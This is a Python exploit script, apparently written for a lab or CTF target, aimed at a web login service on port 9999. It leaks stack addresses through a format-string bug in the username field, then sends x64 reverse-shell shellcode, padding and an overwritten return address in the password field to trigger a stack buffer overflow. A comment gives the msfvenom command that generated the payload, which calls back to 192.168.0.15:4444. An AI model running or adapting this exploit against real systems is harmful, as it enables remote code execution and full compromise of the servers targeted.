import requests
from bs4 import BeautifulSoup
from pwn import p64


def get_stack_addr(): #leak all the stack
    url = "http://localhost:9999/login"
    for i in range(1,300):
        data = {
            "user": f"%{i}$p",
            "password": "mdp"
        }
        try:
            response = requests.post(url, data=data,  timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            error_message = soup.find('h1').find('span', style=lambda value: value and 'color:red' in value)
            if error_message:
                username = error_message.text
                if( username != "(nil)"):
                    integer_value = int(username, 16)
                    print(f"{i}:{username}")

                            
        except requests.exceptions.RequestException as e:
            print("Erreur lors de la requête:", e)


def exploit():
    username = "ok"
    offset = 230
    string_bug = 94
    string_bug_decalage = 0x7ffff75ff810 - 0x7ffff75ff420
    url = "http://192.168.0.15:9999/login"
    data = {
            "user": f"%{string_bug}$p",
            "password": "mdp"
        }
    response = requests.post(url, data=data, timeout=20)
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find('h1').find('span', style=lambda value: value and 'color:red' in value)
    username = error_message.text
    addr_stack = int(username, 16)
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
    buf += b"\x05\xef\xff\xff\xff\x48\xbb\x69\x28\xe6\x95\xc2"
    buf += b"\x8a\x37\x4e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    buf += b"\xff\xe2\xf4\x03\x01\xbe\x0c\xa8\x88\x68\x24\x68"
    buf += b"\x76\xe9\x90\x8a\x1d\x7f\xf7\x6b\x28\xf7\xc9\x02"
    buf += b"\x22\x37\x41\x38\x60\x6f\x73\xa8\x9a\x6d\x24\x43"
    buf += b"\x70\xe9\x90\xa8\x89\x69\x06\x96\xe6\x8c\xb4\x9a"
    buf += b"\x85\x32\x3b\x9f\x42\xdd\xcd\x5b\xc2\x8c\x61\x0b"
    buf += b"\x41\x88\xba\xb1\xe2\x37\x1d\x21\xa1\x01\xc7\x95"
    buf += b"\xc2\xbe\xa8\x66\x2d\xe6\x95\xc2\x8a\x37\x4e"
    data = {
        "user": "ok",
        "password": buf + b"A"*(offset-len(buf)) + p64(addr_stack-string_bug_decalage+2)
    }
    print("buffer addr : ", hex(addr_stack-string_bug_decalage))
    response = requests.post(url, data=data, timeout=20)
    print(data)

#msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.15 LPORT=4444 -b "\x00\x0d\x0a" -f py -o shellcode.txt
exploit()
#get_stack_addr()



